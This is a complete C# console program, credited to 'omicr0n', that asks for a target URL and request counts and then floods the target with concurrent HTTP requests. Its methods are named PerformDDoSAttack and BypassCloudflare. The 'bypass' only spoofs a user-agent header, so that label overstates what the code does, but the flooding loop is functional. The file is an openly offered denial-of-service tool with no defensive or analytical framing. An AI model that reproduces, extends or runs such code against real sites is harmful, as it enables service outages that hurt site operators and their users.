using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Threading;
using System.Text;

class Program
{
    static async Task<string> BypassCloudflare(string targetUrl)
    {
        using (HttpClient client = new HttpClient())
        {
            client.DefaultRequestHeaders.Add("user-agent", "Mozilla/4.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/11.0.1245.0 Safari/537.36");
            return await client.GetStringAsync(targetUrl);
        }
    }

    static async Task PerformDDoSAttack(string targetUrl, int numRequests, int numThreads)
    {
        int successCount = 0;
        int failureCount = 0;
        SemaphoreSlim semaphore = new SemaphoreSlim(1, 1);

        async Task Worker()
        {
            for (int i = 0; i < numRequests / numThreads; i++)
            {
                try
                {
                    string bypassedContent = await BypassCloudflare(targetUrl);
                    await semaphore.WaitAsync();
                    successCount++;
                    Console.WriteLine($"\u001b[32m[+] Request successful: {successCount}");
                    semaphore.Release();
                }
                catch (Exception e)
                {
                    await semaphore.WaitAsync();
                    failureCount++;
                    Console.WriteLine($"\u001b[31m[-] Failed request: {failureCount}");
                    semaphore.Release();
                }
            }
        }

        Task[] tasks = new Task[numThreads];
        for (int i = 0; i < numThreads; i++)
        {
            tasks[i] = Worker();
        }

        await Task.WhenAll(tasks);
    }

    static async Task Main(string[] args)
    {
        while (true)
        {
            Console.Clear();
            Console.WriteLine(@"
▄▀▀▀▀▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▀▄    ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▀▄ 
█      █ █  █ ▀  █ █   █  █  █ █    ▌ █   █   █ █      █ █  █ █ █ 
█      █ ▐  █    █ ▐   █  ▐  ▐ █      ▐  █▀▀█▀  █      █ ▐  █  ▀█ 
▀▄    ▄▀   █    █      █       █       ▄▀    █  ▀▄    ▄▀   █   █  
  ▀▀▀▀   ▄▀   ▄▀    ▄▀▀▀▀▀▄   ▄▀▄▄▄▄▀ █     █     ▀▀▀▀   ▄▀   █   
         █    █    █       █ █     ▐  ▐     ▐            █    ▐   
         ▐    ▐    ▐       ▐ ▐                           ▐        

            \u001b[32mcoding \u001b[31mby \u001b[32momicr0n   
");

            Console.Write("\u001b[32mEnter the target address: \u001b[0m");
            string targetUrl = Console.ReadLine().Trim();

            Console.Write("\u001b[32mHow many requests should be sent per second: \u001b[0m");
            int numThreads = int.Parse(Console.ReadLine().Trim());

            Console.Write("\u001b[32mHow many total requests should be made: \u001b[0m");
            int numRequests = int.Parse(Console.ReadLine().Trim());

            await PerformDDoSAttack(targetUrl, numRequests, numThreads);

            Console.WriteLine("\n\u001b[31mThe program is restarting. Waiting for 5 seconds...\u001b[0m");
            Thread.Sleep(5000);
            Console.Clear();
        }
    }
}
